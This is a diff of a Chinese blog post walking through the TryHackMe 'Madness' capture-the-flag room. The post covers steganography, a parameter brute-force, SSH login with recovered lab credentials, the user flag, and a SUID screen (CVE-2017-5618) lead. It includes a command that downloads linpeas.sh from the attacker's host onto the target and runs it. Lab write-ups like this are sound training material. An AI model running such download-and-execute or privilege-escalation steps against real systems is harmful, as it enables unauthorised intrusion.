@@ -1,22 +1,21 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Madness | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Madness Will you be consumed by Madness?  端口扫描。只开了两个端口    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.144.152.189 22 SSH 10.144.152.189:22  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 0   2 10.144.152.189 80 HTTP">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_Madness | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Madness Will you be consumed by Madness?">
 <meta property="og:type" content="article">
 <meta property="og:title" content="TryHackMe_Madness">
 <meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_Madness.html">
 <meta property="og:site_name" content="X9wd09ncc">
-<meta property="og:description" content="Madness Will you be consumed by Madness?  端口扫描。只开了两个端口    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.144.152.189 22 SSH 10.144.152.189:22  OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 0   2 10.144.152.189 80 HTTP">
+<meta property="og:description" content="Madness Will you be consumed by Madness?">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
 <meta property="article:published_time" content="2026-05-13T12:24:54.000Z">
-<meta property="article:modified_time" content="2026-05-17T10:18:02.297Z">
+<meta property="article:modified_time" content="2026-06-03T08:49:42.678Z">
 <meta property="article:author" content="X9wd09ncc">
 <meta property="article:tag" content="thm">
 <meta property="article:tag" content="easy">
 <meta property="article:tag" content="红队">
-<meta property="article:tag" content="SUID">
 <meta property="article:tag" content="Screen">
 <meta property="article:tag" content="CVE-2017-5618">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_Madness.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_Madness.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
   root: '/',
   algolia: undefined,
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
@@ -45,8 +44,8 @@
   Snackbar: undefined,
   source: {
     justifiedGallery: {
-      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
-      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+      js: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.js',
+      css: 'https://cdn.bootcdn.net/ajax/libs/flickr-justified-gallery/2.1.0/fjGallery.min.css'
     }
   },
   isPhotoFigcaption: false,
@@ -62,8 +61,8 @@
   isPost: true,
   isHome: false,
   isHighlightShrink: false,
-  isToc: false,
-  postUpdate: '2026-05-17 18:18:02'
+  isToc: true,
+  postUpdate: '2026-06-03 16:49:42'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -152,13 +151,22 @@
           if (t === 'dark') activateDarkMode()
           else if (t === 'light') activateLightMode()
         
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
     const detectApple = () => {
       if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
         document.documentElement.classList.add('apple')
       }
     }
     detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
 </head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
   endLoading: () => {
     document.body.style.overflow = '';
@@ -176,220 +184,112 @@ window.addEventListener('load',()=> { preloader.endLoading() })
 if (false) {
   document.addEventListener('pjax:send', () => { preloader.initLoading() })
   document.addEventListener('pjax:complete', () => { preloader.endLoading() })
-}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">53</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Madness</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-13T12:24:54.000Z" title="发表于 2026-05-13 20:24:54">2026-05-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-17T10:18:02.297Z" title="更新于 2026-05-17 18:18:02">2026-05-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="Madness"><a href="#Madness" class="headerlink" title="Madness"></a>Madness</h1><blockquote>
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">63</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_Madness</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-13T12:24:54.000Z" title="发表于 2026-05-13 20:24:54">2026-05-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-03T08:49:42.678Z" title="更新于 2026-06-03 16:49:42">2026-06-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">930</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="Madness"><a href="#Madness" class="headerlink" title="Madness"></a>Madness</h1><blockquote>
 <p>Will you be consumed by Madness?</p>
 </blockquote>
-<p>端口扫描。只开了两个端口</p>
-<table>
+<span id="more"></span>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><table>
 <thead>
 <tr>
-<th>序号</th>
-<th>Host地址</th>
-<th>端口</th>
-<th>协议</th>
-<th>Uri地址</th>
-<th>标题</th>
-<th>Banner</th>
-<th>状态码</th>
+<th align="center">序号</th>
+<th align="left">Host地址</th>
+<th align="center">端口</th>
+<th align="left">协议</th>
+<th align="left">Uri地址</th>
+<th align="left">标题</th>
+<th align="left">Banner</th>
+<th align="center">状态码</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>1</td>
-<td>10.144.152.189</td>
-<td>22</td>
-<td>SSH</td>
-<td>10.144.152.189:22</td>
-<td></td>
-<td><code>OpenSSH 7.2p2 Ubuntu 4ubuntu2.8</code></td>
-<td>0</td>
+<td align="center">1</td>
+<td align="left">10.144.152.189</td>
+<td align="center">22</td>
+<td align="left">SSH</td>
+<td align="left">10.144.152.189:22</td>
+<td align="left"></td>
+<td align="left">OpenSSH 7.2p2 Ubuntu 4ubuntu2.8</td>
+<td align="center">0</td>
 </tr>
 <tr>
-<td>2</td>
-<td>10.144.152.189</td>
-<td>80</td>
-<td>HTTP</td>
-<td><a target="_blank" rel="noopener" href="http://10.144.152.189/">http://10.144.152.189:80</a></td>
-<td>Apache2 Ubuntu Default Page: It works</td>
-<td><code>apache2-ubuntu默认页面</code>,<code>Apache2Debian默认页</code>,<code>Apache/2.4.18 (Ubuntu)</code>,<code>Apache-HTTP-Server-Ubuntu</code>,<code>Apache2 默认页</code>,<code>Apache-Web-Server</code></td>
-<td>200</td>
+<td align="center">2</td>
+<td align="left">10.144.152.189</td>
+<td align="center">80</td>
+<td align="left">HTTP</td>
+<td align="left"><a target="_blank" rel="noopener" href="http://10.144.152.189/">http://10.144.152.189:80</a></td>
+<td align="left">Apache2 Ubuntu Default Page: It works</td>
+<td align="left">apache2-ubuntu默认页面, Apache2Debian默认页, Apache&#x2F;2.4.18 (Ubuntu), Apache-HTTP-Server-Ubuntu, Apache2 默认页, Apache-Web-Server</td>
+<td align="center">200</td>
 </tr>
 </tbody></table>
-<p>访问网页，没什么东西</p>
-<p><img src="/../image/TryHackMe/easy/Madness/apache2.png"></p>
+<h3 id="页面分析"><a href="#页面分析" class="headerlink" title="页面分析"></a>页面分析</h3><p>访问网页，没什么东西</p>
+<p><img src="/../image/TryHackMe/easy/Madness/apache2.png" alt="Apache 默认页面"></p>
 <p>尝试目录扫描，也没有什么信息</p>
 <p>重新回到网页，F12 看到了一条注释，该注释在一张图片下面，且该图片在网页里面并不能正常显示，可能是损坏了</p>
-<p><img src="/../image/TryHackMe/easy/Madness/img.png"></p>
-<p>利用<code> wget</code> 下载图片</p>
-<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
-└─# wget http:&#x2F;&#x2F;10.144.152.189&#x2F;thm.jpg                                                  
---2026-05-13 20:42:09--  http:&#x2F;&#x2F;10.144.152.189&#x2F;thm.jpg
-正在连接 10.144.152.189:80... 已连接。
-已发出 HTTP 请求，正在等待回应... 200 OK
-长度：22210 (22K) [image&#x2F;jpeg]
-正在保存至: “thm.jpg”
-
-thm.jpg                          100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]  21.69K  24.4KB&#x2F;s  用时 0.9s    
-
-2026-05-13 20:42:11 (24.4 KB&#x2F;s) - 已保存 “thm.jpg” [22210&#x2F;22210])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/../image/TryHackMe/easy/Madness/img.png" alt="图片注释"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="文件头修复"><a href="#文件头修复" class="headerlink" title="文件头修复"></a>文件头修复</h3><p>利用 <code>wget</code> 下载图片</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.144.152.189/thm.jpg                                                  </span><br></pre></td></tr></table></figure>
 
 <p>把图片放到 <code>010 editor</code> 里面，图片后缀是 <code>jpg</code>，但是头文件信息却是 <code>png</code></p>
-<p><img src="/../image/TryHackMe/easy/Madness/png.png"></p>
+<p><img src="/../image/TryHackMe/easy/Madness/png.png" alt="PNG 文件头"></p>
 <p>因此修改成正确的头文件，打开图片有一个隐藏目录</p>
-<p><img src="/../image/TryHackMe/easy/Madness/jpg.png"></p>
-<p>访问 <code>th1s_1s_h1dd3n</code>，页面很简洁，还是 <code>F12</code> 又有一条注释，提示 <code>sercet</code> 的值在 <code>0-99</code> 之间</p>
-<p><img src="/../image/TryHackMe/easy/Madness/hidden.png" alt="th1s_1s_h1dd3n"></p>
+<p><img src="/../image/TryHackMe/easy/Madness/jpg.png" alt="修复后的图片"></p>
+<h3 id="隐藏目录"><a href="#隐藏目录" class="headerlink" title="隐藏目录"></a>隐藏目录</h3><p>访问 <code>th1s_1s_h1dd3n</code>，页面很简洁，还是 <code>F12</code> 又有一条注释，提示 <code>sercet</code> 的值在 <code>0-99</code> 之间</p>
+<p><img src="/../image/TryHackMe/easy/Madness/hidden.png" alt="隐藏目录"></p>
 <p>用 <code>burpsuite</code> 爆破，得到一个密码 <code>y2RPJ4QaPF!B</code></p>
-<p><img src="/../image/TryHackMe/easy/Madness/73.png" alt="73"></p>
-<p>用得到的密码来对 <code>thm.jpg</code>  进行隐写分析，发现里面有一个文件，将文件分离出来</p>
+<p><img src="/../image/TryHackMe/easy/Madness/73.png" alt="爆破结果"></p>
+<h3 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h3><p>用得到的密码来对 <code>thm.jpg</code> 进行隐写分析，发现里面有一个文件，将文件分离出来</p>
 <p>查看 <code>hidden.txt</code> 得到用户名 <code>wbxre</code></p>
-<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
-└─# steghide info thm.jpg       
-&quot;thm.jpg&quot;:
-  format: jpeg
-  capacity: 1.0 KB
-Try to get information about embedded data ? (y&#x2F;n) y
-Enter passphrase: 
-  embedded file &quot;hidden.txt&quot;:
-    size: 101.0 Byte
-    encrypted: rijndael-128, cbc
-    compressed: yes
-                                                                                                                                   
-┌──(root㉿kali)-[~&#x2F;桌面]
-└─# steghide --extract -sf thm.jpg                                
-Enter passphrase: 
-wrote extracted data to &quot;hidden.txt&quot;.
-                                                                                                                                   
-┌──(root㉿kali)-[~&#x2F;桌面]
-└─# cat hidden.txt                                                                                                            
-Fine you found the password! 
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide --extract -sf thm.jpg                                </span><br></pre></td></tr></table></figure>
 
-Here&#39;s a username 
-
-wbxre
-
-I didn&#39;t say I would make it easy for you!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to &quot;hidden.txt&quot;.</span><br><span class="line"></span><br><span class="line">cat hidden.txt                                                                                                            </span><br><span class="line">Fine you found the password! </span><br><span class="line"></span><br><span class="line">Here&#x27;s a username </span><br><span class="line"></span><br><span class="line">wbxre</span><br><span class="line"></span><br><span class="line">I didn&#x27;t say I would make it easy for you!</span><br></pre></td></tr></table></figure>
 
 <p>我一开始用这个用户名和密码登录 <code>ssh</code>，但是不行，然后就卡住了</p>
-<p>最后看 <code>wp</code> 才发现在题目页面给的那张图片也可以进行隐写？？？？？只能说逆天</p>
-<p><img src="/../image/TryHackMe/easy/Madness/another_img.png"></p>
+<p>最后看 <code>wp</code> 才发现在题目页面给的那张图片也可以进行隐写</p>
+<p><img src="/../image/TryHackMe/easy/Madness/another_img.png" alt="另一张图片"></p>
 <p>同样使用 <code>steghide</code> 进行分析，而且不需要密码</p>
 <p>得到一个新的密码 <code>*axA&amp;GF8dP</code></p>
-<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
-└─# steghide info 5iW7kC8.jpg     
-&quot;5iW7kC8.jpg&quot;:
-  format: jpeg
-  capacity: 6.6 KB
-Try to get information about embedded data ? (y&#x2F;n) y
-Enter passphrase: 
-  embedded file &quot;password.txt&quot;:
-    size: 83.0 Byte
-    encrypted: rijndael-128, cbc
-    compressed: yes
-                                                                                                                                   
-┌──(root㉿kali)-[~&#x2F;桌面]
-└─# steghide --extract -sf 5iW7kC8.jpg 
-Enter passphrase: 
-wrote extracted data to &quot;password.txt&quot;.
-                                                                                                                                   
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide --extract -sf 5iW7kC8.jpg </span><br></pre></td></tr></table></figure>
 
-┌──(root㉿kali)-[~&#x2F;桌面]
-└─# cat password.txt 
-I didn&#39;t think you&#39;d find me! Congratulations!
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Enter passphrase: </span><br><span class="line">wrote extracted data to &quot;password.txt&quot;.</span><br><span class="line"></span><br><span class="line">cat password.txt </span><br><span class="line">I didn&#x27;t think you&#x27;d find me! Congratulations!</span><br><span class="line"></span><br><span class="line">Here take my password</span><br><span class="line"></span><br><span class="line">*axA&amp;GF8dP</span><br></pre></td></tr></table></figure>
 
-Here take my password
-
-*axA&amp;GF8dP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这里再次尝试登录 <code>ssh</code> ，结果怎么死活都登不上去，只好有看一下<code> wp</code> ，结果告诉我需要前面那个用户名进行 <code>rot13</code> 解码，解码结果为 <code>joker</code>……逆天</p>
+<h3 id="ROT13-解码"><a href="#ROT13-解码" class="headerlink" title="ROT13 解码"></a>ROT13 解码</h3><p>这里再次尝试登录 <code>ssh</code>，结果怎么死活都登不上去，只好有看一下 <code>wp</code>，结果告诉我需要前面那个用户名进行 <code>rot13</code> 解码，解码结果为 <code>joker</code></p>
 <p>好吧，用 <code>joker</code> 和 <code>*axA&amp;GF8dP</code> 总算是登进去了</p>
-<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
-└─# ssh joker@10.144.152.189          
-joker@10.144.152.189&#39;s password: 
-Welcome to Ubuntu 16.04.6 LTS (GNU&#x2F;Linux 4.4.0-170-generic x86_64)
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh joker@10.144.152.189          </span><br></pre></td></tr></table></figure>
 
-Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128
-joker@ubuntu:~$ id
-uid&#x3D;1000(joker) gid&#x3D;1000(joker) groups&#x3D;1000(joker)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">joker@10.144.152.189&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)</span><br><span class="line"></span><br><span class="line">joker@ubuntu:~$ id</span><br><span class="line">uid=1000(joker) gid=1000(joker) groups=1000(joker)</span><br></pre></td></tr></table></figure>
 
 <p>得到第一个 <code>flag</code></p>
-<pre class="line-numbers language-none"><code class="language-none">joker@ubuntu:~$ ls -al
-total 20
-drwxr-xr-x 3 joker joker 4096 May 13 06:13 .
-drwxr-xr-x 3 root  root  4096 Jan  4  2020 ..
--rw------- 1 joker joker    0 Jan  5  2020 .bash_history
--rw-r--r-- 1 joker joker 3771 Jan  4  2020 .bashrc
-drwx------ 2 joker joker 4096 May 13 06:13 .cache
--rw-r--r-- 1 root  root    38 Jan  6  2020 user.txt
-joker@ubuntu:~$ cat user.txt
-THM&#123;d5781e53b130efe2f94f9b0354a5e4ea&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">joker@ubuntu:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">THM&#123;d5781e53b130efe2f94f9b0354a5e4ea&#125;</span><br></pre></td></tr></table></figure>
 
-<p>利用 <code>wget</code> 下载本地的 <code>linpeas.sh</code>，赋予权限并运行</p>
-<pre class="line-numbers language-none"><code class="language-none">joker@ubuntu:~$ wget 192.168.140.133:2518&#x2F;linpeas.sh
---2026-05-13 06:16:23--  http:&#x2F;&#x2F;192.168.140.133:2518&#x2F;linpeas.sh
-Connecting to 192.168.140.133:2518... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 1053413 (1.0M) [application&#x2F;x-sh]
-Saving to: ‘linpeas.sh’
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="Screen-SUID-提权"><a href="#Screen-SUID-提权" class="headerlink" title="Screen SUID 提权"></a>Screen SUID 提权</h3><p>利用 <code>wget</code> 下载本地的 <code>linpeas.sh</code>，赋予权限并运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">joker@ubuntu:~$ wget 192.168.140.133:2518/linpeas.sh</span><br><span class="line">joker@ubuntu:~$ <span class="built_in">chmod</span> +x linpeas.sh </span><br><span class="line">joker@ubuntu:~$ ./linpeas.sh </span><br></pre></td></tr></table></figure>
 
-linpeas.sh                       100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;]   1.00M   537KB&#x2F;s    in 1.9s    
+<p>把结果交给 AI 分析</p>
+<p><code>Screen 4.5.0</code> 版本存在一个著名的漏洞 <code>CVE-2017-5618</code>，当配合 <code>SUID</code> 位时，可以用来读取任意文件或提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)</span><br><span class="line">-rwsr-xr-x 1 root root 1.6M Jan  4  2020 /bin/screen-4.5.0 (Unknown SUID binary!)</span><br><span class="line">-rwsr-xr-x 1 root root 1.6M Jan  4  2020 /bin/screen-4.5.0.old (Unknown SUID binary!)</span><br></pre></td></tr></table></figure>
 
-2026-05-13 06:16:29 (537 KB&#x2F;s) - ‘linpeas.sh’ saved [1053413&#x2F;1053413]
